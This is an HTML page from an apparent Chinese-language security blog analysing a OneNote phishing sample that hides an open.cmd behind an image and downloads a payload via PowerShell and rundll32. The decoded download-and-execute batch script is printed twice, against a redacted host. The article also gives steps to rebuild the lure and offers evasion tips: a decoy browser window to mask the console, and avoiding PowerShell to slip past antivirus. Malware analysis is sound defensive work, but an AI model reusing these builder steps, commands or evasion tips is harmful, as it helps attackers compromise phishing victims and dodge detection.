@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>一个OneNote钓鱼样本分析 | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="一个OneNote钓鱼样本分析 前言 拿到了两个One Note的钓鱼样本。以为是个OneNote的0day，这不得分析分析搞一手。就花了点时间分">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/399/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/399/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="一个OneNote钓鱼样本分析" />
+<meta property="og:description" content="一个OneNote钓鱼样本分析 前言 拿到了两个One Note的钓鱼样本。以为是个OneNote的0day，这不得分析分析搞一手。就花了点时间分" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/399/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-10T16:17:18+00:00" />
+<meta property="article:modified_time" content="2023-02-10T16:17:18+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="一个OneNote钓鱼样本分析"/>
+<meta name="twitter:description" content="一个OneNote钓鱼样本分析 前言 拿到了两个One Note的钓鱼样本。以为是个OneNote的0day，这不得分析分析搞一手。就花了点时间分"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "一个OneNote钓鱼样本分析",
+      "item": "https://a10nggg.github.io/archives/399/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "一个OneNote钓鱼样本分析",
+  "name": "一个OneNote钓鱼样本分析",
+  "description": "一个OneNote钓鱼样本分析 前言 拿到了两个One Note的钓鱼样本。以为是个OneNote的0day，这不得分析分析搞一手。就花了点时间分",
+  "keywords": [
+    
+  ],
+  "articleBody": "一个OneNote钓鱼样本分析 前言 拿到了两个One Note的钓鱼样本。以为是个OneNote的0day，这不得分析分析搞一手。就花了点时间分析了一下，并且成功复现了手法。\n沙箱分析 但凡是个正常人，肯定是不会直接双击样本的。打开用杀软先静态扫了一波，df报毒了，某60和某绒没报毒（不知道当你看到这的时候会不会报毒）。然后在虚拟机上装一个OneNote。趁这个时间，把样本扔到沙箱分析一下。这里用的是qax的沙箱。\n文件概要 扔上去之后，发现已经有人在我之前跑过沙箱了，不用等了看结果。不出意外，肯定是恶意的文件，文件类型被 定义为Powershell Script File​。这里沙箱给出的结果的是木马。emmm，还不错。\n行为分析 查看行为分析，这里给出的是：\n分配可读、可写、可执行内存空间(通常为了解压自身) 了解过ShellCode加载的师傅可能很熟悉这个分配可读、可写、可执行内存空间的行为了，这就是常见的一个ShellCode加载的所有的行为特征（要是我，我肯定先申请一个rw…）。所以从这里看呢，这就是一个ShellCode加载器了。继续往下看行为分析图。\n行为分析图 看到这里的调用链，狂喜，这真不会是个0day吧。One Note后调用powershell，之前我也分析过word漏洞的样本，列如之前我写过的CVE-2021-40444、CVE-2022-30190，有一点熟悉的感觉。\n网络行为 网络行为这里是空的，当时很疑惑，按道理说机器上线时候是有回连c2的包的啊，不应该啊，后面再看沙箱运行的截图，发现沙箱的网络可能不通，所以这里可能就没有外连。\n手动分析 手撸一下 我先去网上找了一波OneNote文件的结构，但是没有找到，有关于.one文件的解析，但是也不重要了。拖到WinHex先看下文件头。文件头是\nE4525C7B8C 开头不是504b0304（因为docx、xlsx这之类的文件其实是采用zip压缩算法的压缩包），所以.one这跟docx他们的结构还不一样，\n没事儿，继续看。往下拖的时候，发现了里面有几张图片的文件头和文件尾的16进制数。文件里应该是有图片。拖到后面，发现了一段powershell命令。直接复制出来。\n这段的大概意思就是，使用了 .NET Framework 中的 System.Text.Encoding 和 System.Convert 类。它的作用是将一个 Base64 编码的字符串转换为 ASCII 编码的字符串。.FromBase64String​ 方法是 System.Convert 类中的一个方法，它接收一个 Base64 编码的字符串，并返回其对应的字节数组。因此，这段代码需要一个 Base64 编码的字符串作为参数，并将其转换为 ASCII 编码的字符串。\n然后再将结果输出到文件C:\\ProgramData\\in.cmd​里，然后再去执行他。现在的关键点就在他执行的内容是啥了，我们将base64字符串解码。\n@echo off powershell Invoke-WebRequest -URI https://xxxxx.org/aswyw/01.gif -OutFile C:\\programdata\\putty.jpg rundll32 C:\\programdata\\putty.jpg,Wind exit 这里的内容主要就两句了，从web上去下载文件到C:\\programdata\\putty.jpg​，然后用rundll32去导出里面的函数执行从而上线。他导出的函数，就是ShellCode加载的函数了。\n我去访问了一下这个文件，发现这个文件已经变成空文件了，本来还想顺便掏出ida pro分析一下加载器的（谁说搞web的就不会点二进制了），顺便嫖一下人家的思路，看来是没戏了。顺便看了一下这个网站，应该是被ri了挂的文件上去，框架是WordPress的v6.1.1,版本比较新，应该是插件的洞打的。顺便说一下，另外的一个站也是WordPress的v6.1.1，怀疑是批量搂了一波站。\n‍\n双击打开 静态能看的都看完了，看完这些东西，OneNote也早就装好了，双击打开文件是一个OneNote的页面，原来刚刚在WinHex看到的图片就是他们OneNote居然没有压缩。有一个open，注意这里的open。习惯随便拖一下图片，发现拖不动，但是发现文件是只读，这里我以为是跟word一样，文件属性只能读，这里卡了一会。\n然后就是随便点一下。双击open的时候会提示打开附件可能会有害，无视风险继续。会弹出powershell的窗口，直接某60就拦掉了，他这里动态还是过不了的。\n到这里知道了他能干什么，但是由于无法编辑，还是不能知道他是怎么制作的。一筹莫展之际，就看看文件属性，果然，这里的文件属性被设置成了只读，改掉之后继续分析。\n查看历史编辑的记录，是在2月7号编辑的，时间还不是很长。\n拖开open那个小图标，小黑子鸡脚就露出来了，发现了后面藏的一个cmd文件。\n把cmd文件拖出来，里面就是我们刚刚看到的那串PowerShell代码了。\n复现制作过程 制作非常简单，几乎不需要什么技巧，主要要考虑的姿势还是cmd里的内容。\n首先需要两张图片，一张背景，一张用来挡住cmd文件的图标。\n把背景拖入.one，置底。 制作cmd文件，文件名为open.cmd，这里可以自由发挥，导入.one，这里的cmd里面是windows的shell命令，总之是能上线就行。 把open这张小图片导入，然后置顶盖住cmd的图标就行。 保存之后把文件属性改为只读。 总结 这个样本的触发需要诱导用户手动点击，跟word的宏差不多，要是人家收到不点击，直接给你关掉就寄了，所以可用性还是不高。\n还有就是打开会出现一个黑框，要等程序全部退出之后才会退出，这样肯定会让对面有所察觉，会被及时应急掉。我们可以加一句打开浏览器，窗口先弹出，然后浏览器弹出会盖掉窗口。同样出现浏览器出来打开了OneNote的官方网站，也会降低用户的猜忌。\n@echo off start https://www.onenote.com/ powershell Invoke-WebRequest -URI https://xxx.org/aswyw/01.gif -OutFile C:\\programdata\\putty.jpg rundll32 C:\\programdata\\putty.jpg,Wind exit 用的powershell，powershell在国内的杀软是监控很死的，动态大概率会寄掉的。所以只要用户点击了，我们能执行cmd里的命令，就不要去调powershell了，可以尝试找一下白程序去下载文件然后执行等等思路，这里就不细说，仅仅是一个抛砖引玉，欢迎师傅们跟我交流。 ‍\n",
+  "wordCount" : "2363",
+  "inLanguage": "en",
+  "datePublished": "2023-02-10T16:17:18Z",
+  "dateModified": "2023-02-10T16:17:18Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/399/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      一个OneNote钓鱼样本分析
+    </h1>
+    <div class="post-meta"><span title='2023-02-10 16:17:18 +0000 +0000'>February 10, 2023</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="一个onenote钓鱼样本分析">一个OneNote钓鱼样本分析<a hidden class="anchor" aria-hidden="true" href="#一个onenote钓鱼样本分析">#</a></h1>
+<h1 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h1>
+<p>拿到了两个One Note的钓鱼样本。以为是个OneNote的0day，这不得分析分析搞一手。就花了点时间分析了一下，并且成功复现了手法。</p>
+<h1 id="沙箱分析">沙箱分析<a hidden class="anchor" aria-hidden="true" href="#沙箱分析">#</a></h1>
+<p>但凡是个正常人，肯定是不会直接双击样本的。打开用杀软先静态扫了一波，df报毒了，某60和某绒没报毒（不知道当你看到这的时候会不会报毒）。然后在虚拟机上装一个OneNote。趁这个时间，把样本扔到沙箱分析一下。这里用的是qax的沙箱。</p>
+<h2 id="文件概要">文件概要<a hidden class="anchor" aria-hidden="true" href="#文件概要">#</a></h2>
+<p>扔上去之后，发现已经有人在我之前跑过沙箱了，不用等了看结果。不出意外，肯定是恶意的文件，文件类型被 定义为<code>Powershell Script File</code>​。这里沙箱给出的结果的是木马。emmm，还不错。</p>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016115414.png" alt="file"  />
+</p>
+<h2 id="行为分析">行为分析<a hidden class="anchor" aria-hidden="true" href="#行为分析">#</a></h2>
+<p>查看行为分析，这里给出的是：</p>
+<pre><code>分配可读、可写、可执行内存空间(通常为了解压自身)
+</code></pre>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016115979.png" alt="file"  />
+<br>
+了解过ShellCode加载的师傅可能很熟悉这个分配可读、可写、可执行内存空间的行为了，这就是常见的一个ShellCode加载的所有的行为特征（要是我，我肯定先申请一个rw&hellip;）。所以从这里看呢，这就是一个ShellCode加载器了。继续往下看行为分析图。</p>
+<h2 id="行为分析图">行为分析图<a hidden class="anchor" aria-hidden="true" href="#行为分析图">#</a></h2>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016151848.png" alt="file"  />
+</p>
+<p>看到这里的调用链，狂喜，这真不会是个0day吧。One Note后调用powershell，之前我也分析过word漏洞的样本，列如之前我写过的CVE-2021-40444、CVE-2022-30190，有一点熟悉的感觉。</p>
+<h2 id="网络行为">网络行为<a hidden class="anchor" aria-hidden="true" href="#网络行为">#</a></h2>
+<p>网络行为这里是空的，当时很疑惑，按道理说机器上线时候是有回连c2的包的啊，不应该啊，后面再看沙箱运行的截图，发现沙箱的网络可能不通，所以这里可能就没有外连。<br>
+<img loading="lazy" src="/uploads/2023/02/2023021016153741.png" alt="file"  />
+</p>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016142246.png" alt="file"  />
+</p>
+<h1 id="手动分析">手动分析<a hidden class="anchor" aria-hidden="true" href="#手动分析">#</a></h1>
+<h2 id="手撸一下">手撸一下<a hidden class="anchor" aria-hidden="true" href="#手撸一下">#</a></h2>
+<p>我先去网上找了一波OneNote文件的结构，但是没有找到，有关于.one文件的解析，但是也不重要了。拖到WinHex先看下文件头。文件头是</p>
+<pre><code>E4525C7B8C
+</code></pre>
+<p>开头不是504b0304（因为docx、xlsx这之类的文件其实是采用zip压缩算法的压缩包），所以.one这跟docx他们的结构还不一样，<br>
+<img loading="lazy" src="/uploads/2023/02/2023021016161522.png" alt="file"  />
+</p>
+<p>没事儿，继续看。往下拖的时候，发现了里面有几张图片的文件头和文件尾的16进制数。文件里应该是有图片。拖到后面，发现了一段powershell命令。直接复制出来。</p>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016162085.png" alt="file"  />
+<br>
+这段的大概意思就是，使用了 .NET Framework 中的 System.Text.Encoding 和 System.Convert 类。它的作用是将一个 Base64 编码的字符串转换为 ASCII 编码的字符串。<code>.FromBase64String</code>​ 方法是 System.Convert 类中的一个方法，它接收一个 Base64 编码的字符串，并返回其对应的字节数组。因此，这段代码需要一个 Base64 编码的字符串作为参数，并将其转换为 ASCII 编码的字符串。</p>
+<p>然后再将结果输出到文件<code>C:\ProgramData\in.cmd</code>​里，然后再去执行他。现在的关键点就在他执行的内容是啥了，我们将base64字符串解码。</p>
+<pre><code>@echo off
+powershell Invoke-WebRequest -URI https://xxxxx.org/aswyw/01.gif -OutFile C:\programdata\putty.jpg
+rundll32 C:\programdata\putty.jpg,Wind
+exit
+</code></pre>
+<p>这里的内容主要就两句了，从web上去下载文件到<code>C:\programdata\putty.jpg</code>​，然后用rundll32去导出里面的函数执行从而上线。他导出的函数，就是ShellCode加载的函数了。</p>
+<p>我去访问了一下这个文件，发现这个文件已经变成空文件了，本来还想顺便掏出ida pro分析一下加载器的（谁说搞web的就不会点二进制了），顺便嫖一下人家的思路，看来是没戏了。顺便看了一下这个网站，应该是被ri了挂的文件上去，框架是WordPress的v6.1.1,版本比较新，应该是插件的洞打的。顺便说一下，另外的一个站也是WordPress的v6.1.1，怀疑是批量搂了一波站。</p>
+<p>‍</p>
+<h2 id="双击打开">双击打开<a hidden class="anchor" aria-hidden="true" href="#双击打开">#</a></h2>
+<p>静态能看的都看完了，看完这些东西，OneNote也早就装好了，双击打开文件是一个OneNote的页面，原来刚刚在WinHex看到的图片就是他们OneNote居然没有压缩。有一个open，注意这里的open。习惯随便拖一下图片，发现拖不动，但是发现文件是只读，这里我以为是跟word一样，文件属性只能读，这里卡了一会。</p>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016163169.png" alt="file"  />
+</p>
+<p>然后就是随便点一下。双击open的时候会提示打开附件可能会有害，无视风险继续。会弹出powershell的窗口，直接某60就拦掉了，他这里动态还是过不了的。</p>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016163642.png" alt="file"  />
+</p>
+<p>到这里知道了他能干什么，但是由于无法编辑，还是不能知道他是怎么制作的。一筹莫展之际，就看看文件属性，果然，这里的文件属性被设置成了只读，改掉之后继续分析。</p>
+<p>查看历史编辑的记录，是在2月7号编辑的，时间还不是很长。</p>
+<p>拖开open那个小图标，小黑子鸡脚就露出来了，发现了后面藏的一个cmd文件。</p>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016164133.png" alt="file"  />
+</p>
+<p>把cmd文件拖出来，里面就是我们刚刚看到的那串PowerShell代码了。</p>
+<h1 id="复现制作过程">复现制作过程<a hidden class="anchor" aria-hidden="true" href="#复现制作过程">#</a></h1>
+<p>制作非常简单，几乎不需要什么技巧，主要要考虑的姿势还是cmd里的内容。</p>
+<p>首先需要两张图片，一张背景，一张用来挡住cmd文件的图标。</p>
+<ol>
+<li>把背景拖入.one，置底。</li>
+</ol>
+<p><img loading="lazy" src="/uploads/2023/02/2023021016164615.png" alt="file"  />
+</p>
+<ol start="2">
+  <li>
+    制作cmd文件，文件名为open.cmd，这里可以自由发挥，导入.one，这里的cmd里面是windows的shell命令，总之是能上线就行。
+  </li>
+  <li>
+    把open这张小图片导入，然后置顶盖住cmd的图标就行。
+  </li>
+  <li>
+    保存之后把文件属性改为只读。
+  </li>
+</ol>
+<h1 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h1>
+<ol>
+<li>
+<p>这个样本的触发需要诱导用户手动点击，跟word的宏差不多，要是人家收到不点击，直接给你关掉就寄了，所以可用性还是不高。</p>
+</li>
+<li>
+<p>还有就是打开会出现一个黑框，要等程序全部退出之后才会退出，这样肯定会让对面有所察觉，会被及时应急掉。我们可以加一句打开浏览器，窗口先弹出，然后浏览器弹出会盖掉窗口。同样出现浏览器出来打开了OneNote的官方网站，也会降低用户的猜忌。</p>
+</li>
+</ol>
+<pre><code>@echo off
+start https://www.onenote.com/
+powershell Invoke-WebRequest -URI https://xxx.org/aswyw/01.gif -OutFile C:\programdata\putty.jpg
+rundll32 C:\programdata\putty.jpg,Wind
+exit
+</code></pre>
+<ol start="3">
+  <li>
+    用的powershell，powershell在国内的杀软是监控很死的，动态大概率会寄掉的。所以只要用户点击了，我们能执行cmd里的命令，就不要去调powershell了，可以尝试找一下白程序去下载文件然后执行等等思路，这里就不细说，仅仅是一个抛砖引玉，欢迎师傅们跟我交流。
+  </li>
+</ol>
+<p>‍</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
